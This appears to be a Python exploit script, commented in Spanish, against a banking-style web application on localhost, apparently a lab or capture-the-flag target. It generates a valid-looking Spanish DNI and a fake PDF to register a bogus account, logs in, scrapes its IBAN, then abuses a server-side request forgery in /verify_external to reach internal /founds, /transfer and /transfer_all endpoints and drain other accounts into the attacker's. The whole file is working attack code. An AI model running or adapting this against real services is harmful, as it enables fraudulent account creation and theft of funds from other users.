import requests
import random
import string
import json
import re
from bs4 import BeautifulSoup

# Configuración
TARGET = "http://127.0.0.1:80"
INTERNAL = "http://127.0.0.1:443"
session = requests.Session()

# Mapa para calcular letra del DNI
DNI_LETTERS = "TRWAGMYFPDXBNJZSQVHLCKE"

def generar_dni():
    """Genera un DNI válido con letra de control"""
    num = random.randint(10000000, 99999999)
    letra = DNI_LETTERS[num % 23]
    return f"{num}{letra}"

def generar_pdf_fake(nombre="falso.pdf"):
    """Crea un PDF ficticio con contenido aleatorio >1KB"""
    with open(nombre, "wb") as f:
        contenido = ''.join(random.choices(string.ascii_letters + string.digits, k=2048))
        f.write(contenido.encode())
    return nombre

def registrar_usuario(dni, nombre, password, pdf_path):
    """Hace POST al /register con el formulario y el PDF generado"""
    url = f"{TARGET}/register"
    with open(pdf_path, "rb") as pdf_file:
        data = {
            "dni": dni,
            "fullname": nombre,
            "password": password
        }
        files = {
            "document": (pdf_path, pdf_file, "application/pdf")
        }
        r = session.post(url, data=data, files=files)
    print(f"[+] Registro enviado: {r.status_code}")
    return r.status_code == 200

def login_usuario(dni, password):
    """Hace login en /login con las credenciales"""
    url = f"{TARGET}/login"
    data = {
        "dni": dni,
        "password": password
    }
    r = session.post(url, data=data)
    print(f"[+] Login: {r.status_code}")
    return r.status_code == 200

def obtener_iban_personal():
    """Accede al /dashboard y extrae el IBAN desde el HTML"""
    r = session.get(f"{TARGET}/dashboard")
    match = re.search(r"IBAN: ([A-Z0-9]+)", r.text)
    if match:
        iban = match.group(1)
        print(f"[+] IBAN personal: {iban}")
        return iban
    print("[-] No se pudo obtener el IBAN personal")
    return None

def fetch_ssrf(url_objetivo):
    """Envia un SSRF contra /verify_external con la URL objetivo"""
    url = f"{TARGET}/verify_external"
    data = {
        "url": url_objetivo
    }
    r = session.post(url, data=data)
    print(f"[+] SSRF fetch {url_objetivo} -> {r.status_code}")
    return r.text

def extraer_ibans_y_transferir_con_ssrf(iban_victima):
    """Exploita SSRF para listar cuentas e intenta transferir 1€ desde cada una a la cuenta propia"""
    # Paso 1: Obtener contenido de /founds por SSRF
    """
    raw = fetch_ssrf(f"{INTERNAL}/founds")
    
    # Arreglo bruto del JSON roto
    json_sano = raw.split('[')[-1].rsplit(']', 1)[0] + "]"
    json_sano = "[" + json_sano
    try:
        cuentas = json.loads(json_sano)
    except Exception as e:
        print("[-] Error procesando JSON:", e)
        return
    
    # Paso 2: Transferir desde cada cuenta hacia la nuestra
    for cuenta in cuentas:
        from_iban = cuenta.get("iban")
        if not from_iban or from_iban == iban_victima:
            continue
        ssrf_url = f"{INTERNAL}/transfer?from_iban={from_iban}&to_iban={iban_victima}&amount=1"
        respuesta = fetch_ssrf(ssrf_url)
        print(f"[+] Transferencia desde {from_iban} hacia {iban_victima}: {respuesta.strip()[:100]}...")
    """
    ssrf_url = f"{INTERNAL}/transfer_all?to_iban={iban_victima}"
    respuesta = fetch_ssrf(ssrf_url)

# ===================== EJECUCIÓN ==========================

dni = generar_dni()
nombre = "H4ck3r SSRF"
password = "SSRFpwned123"
pdf = generar_pdf_fake()

print(f"[.] Registrando con DNI: {dni}")

if registrar_usuario(dni, nombre, password, pdf):
    if login_usuario(dni, password):
        mi_iban = obtener_iban_personal()
        if mi_iban:
            extraer_ibans_y_transferir_con_ssrf(mi_iban)
